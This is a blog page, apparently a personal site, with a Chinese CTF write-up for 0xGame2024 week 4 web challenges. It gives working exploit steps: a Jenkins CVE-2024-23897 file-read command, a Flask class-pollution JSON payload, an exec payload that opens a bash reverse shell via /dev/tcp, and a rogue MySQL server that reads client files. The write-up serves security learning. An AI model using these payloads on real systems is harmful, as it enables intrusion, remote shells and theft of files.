@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    
+    <meta charset="UTF-8">
+    <title>0xGame2024 week4 - N0tluS.site</title>
+    <link rel="shortcut icon" href="/static/img/icon.png">
+    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
+    
+<link rel="stylesheet" href="/static/kico.css">
+<link rel="stylesheet" href="/static/hingle.css">
+
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <meta property="og:site_name" content="N0tluS.site">
+    <meta property="og:title" content="0xGame2024 week4"/>
+    
+    <style>body:before{ content: ''; background-image: url(https://api.paugram.com/wallpaper?source=gh) }</style>
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    <header>
+    <div class="head-title">
+        <h4>N0tluS.site</h4>
+    </div>
+    <div class="head-action">
+        <div class="toggle-btn"></div>
+        <div class="light-btn"></div>
+        <div class="search-btn"></div>
+    </div>
+    <form class="head-search" method="post">
+        <input type="text" name="s" placeholder="搜索什么？">
+    </form>
+    <nav class="head-menu">
+        <a href="/">首页</a>
+        <div class="has-child">
+            <a href>分类</a>
+            <div class="sub-menu">
+                <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a><a class="category-link" href="/categories/wp/">wp</a>
+            </div>
+        </div>
+        
+            <a href="/about">关于我</a>
+        
+    </nav>
+</header>
+
+    <main>
+    <div class="wrap min">
+        <section class="post-title">
+            <h2>0xGame2024 week4</h2>
+            <div class="post-meta">
+                <time class="date">2024.11.04</time>
+            
+                <span class="category"><a class="category-link" href="/categories/wp/">wp</a></span>
+            
+            </div>
+        </section>
+        <article class="post-content">
+        
+            <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><p>Jenkins版本为2.44.1，存在任意文件读取漏洞，参考<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897/README.zh-cn.md</a></p>
+<p>访问<code>8.130.84.100:8080/jnlpJars/jenkins-cli.jar</code>下载到官方提供的命令行客户端后，输入命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-jar</span> jenkins<span class="literal">-cli</span>.jar <span class="literal">-s</span> http://<span class="number">8.130</span>.<span class="number">84.100</span>:<span class="number">8080</span> <span class="literal">-http</span> <span class="built_in">connect-node</span> <span class="string">&quot;@/flag&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="basic-flask"><a href="#basic-flask" class="headerlink" title="basic_flask"></a>basic_flask</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dst</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dst = Dst()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;main.py&quot;</span>).read()</span><br><span class="line">    merge(request.get_json(), dst)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>flask原型链污染，post发包</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;app&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_static_folder&quot;</span><span class="punctuation">:</span><span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里解释一下：</p>
+<ul>
+<li>app全局变量：<ul>
+<li>app对象包含了大量的方法和功能，例如<code>route run add_url_rule</code>等，这些方法用于处理请求和设置应用的各种配置</li>
+</ul>
+</li>
+<li>_static_folder全局变量：<ul>
+<li>_static_folder是flask应用中应用中用于指定静态文件的文件夹路径<code>/static</code>，包括<code>CSS JS </code>和图像文件等</li>
+</ul>
+</li>
+</ul>
+<p>这里就是把根目录设置为了静态文件的存放目录，原型链污染之后就可以通过访问<code>/static/&lt;filename&gt;</code>来实现任意文件下载</p>
+
+
+
+
+<h3 id="basic-pwn"><a href="#basic-pwn" class="headerlink" title="basic_pwn"></a>basic_pwn</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">functions=<span class="built_in">globals</span>()[<span class="string">&#x27;__builtins__&#x27;</span>].__dict__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwn&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    stack = []</span><br><span class="line">    stack.append(<span class="string">&#x27;print&#x27;</span>)</span><br><span class="line">    name=request.get_json().get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> name:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Fail&quot;</span></span><br><span class="line">    stack.extend(name)</span><br><span class="line">    args=stack.pop()</span><br><span class="line">    func=stack.pop()</span><br><span class="line">    functions[func](args)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>本地测一下就知道<code>self.__init__.globals__.__builtins__</code>下面有<code>exec, eval</code>两个可以执行代码的模块，这里用exec来反弹shell</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;exec&quot;</span><span class="punctuation">,</span><span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;).read()&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="rouge-mysql"><a href="#rouge-mysql" class="headerlink" title="rouge_mysql"></a>rouge_mysql</h3><p>注意到这一段，处理MySQL LOAD DATA INFILE等需要读取本地文件的操作</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">GlobalHandler</span> <span class="keyword">for</span> <span class="title class_">UnsafeFsHandler</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">handle</span>(&amp;<span class="keyword">self</span>, file_name: &amp;[<span class="type">u8</span>]) <span class="punctuation">-&gt;</span> BoxFuture&lt;<span class="symbol">&#x27;static</span>, <span class="type">Result</span>&lt;InfileData, LocalInfileError&gt;&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">path</span> = <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(file_name).<span class="title function_ invoke__">to_string</span>();</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">move</span> &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;reading file: &#123;&#125;&quot;</span>, path);</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">file</span> = File::<span class="title function_ invoke__">open</span>(path).<span class="keyword">await</span>?;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(<span class="type">Box</span>::<span class="title function_ invoke__">pin</span>(ReaderStream::<span class="title function_ invoke__">new</span>(file)) <span class="keyword">as</span> InfileData)</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_ invoke__">boxed</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>考点大概是通过MySQL LOAD DATA特性来达到任意文件读取，我们需要构造一个恶意的mysql服务，这个mysql服务甚至不需要实现任何功能，当客户端连接上这个假的恶意mysql服务时，就能完成对客户端的文件读取</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://lightless.me/archives/read-mysql-client-file.html">Read MySQL Client’s File - lightless blog</a></p>
+<p>直接用工具一把嗦了<a target="_blank" rel="noopener" href="https://github.com/PumpkinDemo/Rogue-Mysql-Server">PumpkinDemo&#x2F;Rogue-Mysql-Server: A rogue mysql server written with python asyncio (github.com)</a></p>
+<p>vps上运行server.py，把要读取的文件改为<code>/flag</code>，然后客户端上访问ip:3306，其他参数随意</p>
+
+
+        </article>
+        <section class="post-near">
+            <ul>
+                
+                    <li>上一篇: 看完啦 (つд⊂)</li>
+                
+                
+                    <li>下一篇: <a href="/2024/10/31/Shiro-550%E5%88%86%E6%9E%90/">Shiro-550分析</a></li>
+                
+            </ul>
+        </section>
+        
+            <section class="post-tags">
+            <a class="-none-link" href="/tags/wp/" rel="tag">wp</a>
+            </section>
+        
+    
+        <section class="post-author">
+        
+            <figure class="author-avatar">
+                <img src="https://gravatar.com/userimage/255640517/d60e38ce04bcad4f72b37aa8b3cb4727.jpeg?size=256" alt="N0tluS" />
+            </figure>
+        
+            <div class="author-info">
+                <h4>N0tluS</h4>
+                <p>ovo</p>
+            </div>
+        </section>
+    
+    </div>
+</main>
+
+    <footer>
+    <div class="buttons">
+        <button class="to-top" href="#"></button>
+    </div>
+    <div class="wrap min">
+        <section class="widget">
+            <div class="row">
+                <div class="col-m-4">
+                    <h3 class="title-recent">最新文章：</h3>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/11/04/0xGame2024-week4/">0xGame2024 week4</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/31/Shiro-550%E5%88%86%E6%9E%90/">Shiro-550分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/27/0xGame2024-week3/">0xGame2024 week3</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/24/0xGame2024-week2/">0xGame2024 week2</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/24/0xGame2024-week1/">0xGame2024 week1</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/">Java反序列化之CB1</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-date">时光机：</h3>
+                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-tags">标签云：</h3>
+                    <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Java安全</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a>
+                </div>
+            </div>
+        </section>
+        <section class="sub-footer">
+            <p>© 2024 <a href="/">N0tluS.site</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
+        </section>
+    </div>
+</footer>
+
+
+<script src="/static/kico.js"></script>
+<script src="/static/hingle.js"></script>
+
+
+<script>var hingle = new Paul_Hingle({"copyright":false,"night":true});</script>
+
+  </body>
+</html>
